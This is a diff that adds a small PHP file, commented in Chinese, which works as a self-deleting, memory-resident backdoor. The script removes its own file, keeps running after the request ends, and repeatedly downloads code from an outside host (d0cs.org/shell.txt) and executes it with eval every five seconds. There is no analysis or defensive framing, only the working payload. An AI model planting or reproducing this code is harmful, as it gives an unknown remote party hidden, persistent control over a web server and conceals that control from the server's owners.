@@ -1,0 +1,10 @@
+<?php
+unlink($_SERVER['SCRIPT_FILENAME']); // 删除自身
+ignore_user_abort(true); // 驻留进程，等待指令
+set_time_limit(0); // 不关闭程序，保持连接
+$remote_file = 'http://www.d0cs.org/shell.txt';
+while($code = file_get_contents($remote_file)){ // 获取$remote_file的内容
+  @eval($code);
+  sleep(5);
+};
+?>
